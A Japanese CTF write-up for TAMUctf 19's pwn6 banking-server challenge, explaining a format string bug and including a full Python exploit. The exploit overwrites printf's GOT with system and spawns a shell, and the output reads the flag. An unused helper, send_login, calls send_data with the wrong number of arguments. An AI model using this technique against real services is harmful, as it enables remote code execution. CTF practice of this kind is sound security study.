# [pwn 500pts] pwn6 - TAMUctf 19
64ビットバイナリで、SSPが有効です。
```
$ checksec server
[*] 'server'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
OpenVPN上でサービスが動いているという見たことがないタイプのpwnです。
銀行サービスのサーバーとクライアントのバイナリが渡されます。
参加時は解析する機能が多すぎて解くのをやめました。

IDAで解析していくと、`process_message`関数にFormat String Bugがあることが分かります。
不正なコマンドを送ったときにその内容をprintfでそのまま出力してしまっています。
したがって、不正なコマンドとFSBのpayloadを送れば攻撃できそうです。

方針としては1回目のFSBでprintfのGOTにPLTのsystem関数のアドレスを書き込み、2回目に'/bin/sh'をprintfに与えます。

ここで注意する必要があるのが、64ビットなので書き込み先のアドレスは後ろに持っていく必要がある点です。
先にアドレスを書くと、64ビットのアドレスにはNULLが入っているのでそこまでしか出力されず、肝心の書式(%n)が実行されません。
その点に注意してexploitを書くと次のようになります。

```python
from ptrlib import *

def send_data(data, i):
    payload = p32(len(data))
    payload += p32(i)
    payload += data
    sock.send(payload)

def send_login(username, password):
    payload = bytes([len(username)])
    payload += bytes([len(password)])
    payload += username
    payload += password
    return send_data(len(payload), payload, 0)

elf = ELF("./server")
sock = Socket("127.0.0.1", 6210)

addr = elf.got("printf")
write = 0x401a10 # system@plt

payload = b"AAA"
n = 3
p = 15 + 12
for i in range(8):
    x = (write >> (8 * i)) & 0xFF
    l = (x - n - 1) % 0x100 + 1
    payload += str2bytes("%{}c%{}$hhn".format(l, p + i))
    n += l
assert len(payload) % 8 == 0
for i in range(8):
    payload += p64(addr + i)
print(payload)

send_data(payload, 10)
send_data(b"exec <&5 >&5 2>&5; /bin/sh\x00", 10)

sock.interactive()
```

できました。
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:6210
b'AAA%13c%27$hhn%10c%28$hhn%38c%29$hhn%192c%30$hhn%256c%31$hhn%256c%32$hhn%256c%33$hhn%256c%34$hhn\xd0\x00m\x00\x00\x00\x00\x00\xd1\x00m\x00\x00\x00\x00\x00\xd2\x00m\x00\x00\x00\x00\x00\xd3\x00m\x00\x00\x00\x00\x00\xd4\x00m\x00\x00\x00\x00\x00\xd5\x00m\x00\x00\x00\x00\x00\xd6\x00m\x00\x00\x00\x00\x00\xd7\x00m\x00\x00\x00\x00\x00'
[ptrlib]$ ls
Banking.db
flag.txt
pwn4
[ptrlib]$ cat flag.txt
gigem{flag}
[ptrlib]$ 
```

公式writeupによるとアカウントのパスワードを辞書攻撃してログインしてからROPするようで、FSBは非想定解だったそうです。
それはpwn問としてダメでしょ。

# 感想
FSBに気づけてれば競技中に解けただろうなー。
HopperとかアセンブリをCっぽく表示してくれるやつ使うべきなのか。
